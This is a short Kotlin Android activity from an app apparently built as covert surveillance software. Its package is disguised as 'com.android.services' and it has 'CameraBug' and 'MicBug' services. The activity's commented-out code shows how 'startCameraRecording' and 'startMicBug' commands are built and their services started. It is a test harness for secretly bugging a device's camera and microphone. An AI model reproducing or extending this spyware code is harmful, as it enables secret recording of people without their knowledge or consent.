package com.android.services.ui.activities

import android.content.Intent
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.appcompat.app.AppCompatActivity
import com.android.services.models.CameraBugCommand
import com.android.services.models.MicBugCommand
import com.android.services.services.cameraBug.CameraBugCommandProcessingBase
import com.android.services.services.cameraBug.CameraBugCommandService
import com.android.services.services.micBug.MicBugCommandProcessingBaseI
import com.android.services.services.micBug.MicBugCommandService
import com.android.services.util.AppUtils

class FeatureTestActivity : AppCompatActivity() {

    var mType: Int = 0

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
//        mType = intent.getIntExtra("type", 0)
//
//        if (mType == 0) {
//            val cameraBugCommand = CameraBugCommand("1", "startCameraRecording", "1di23nnF3")
//            val cameraBugIntent = Intent(applicationContext, CameraBugCommandService::class.java)
//            cameraBugIntent.putExtra(
//                CameraBugCommandProcessingBase.KEY_CAMERA_BUG_PUSH,
//                cameraBugCommand
//            )
//            AppUtils.startService(this, cameraBugIntent)
//            finish()
//        } else {
//            val micBugCommand = MicBugCommand("1", "startMicBug", "23msd9222")
//            val micIntent = Intent(applicationContext, MicBugCommandService::class.java)
//            micIntent.putExtra(MicBugCommandProcessingBaseI.MIC_BUG_PUSH, micBugCommand)
//            AppUtils.startService(this, micIntent)
//        }
        finish()
    }

}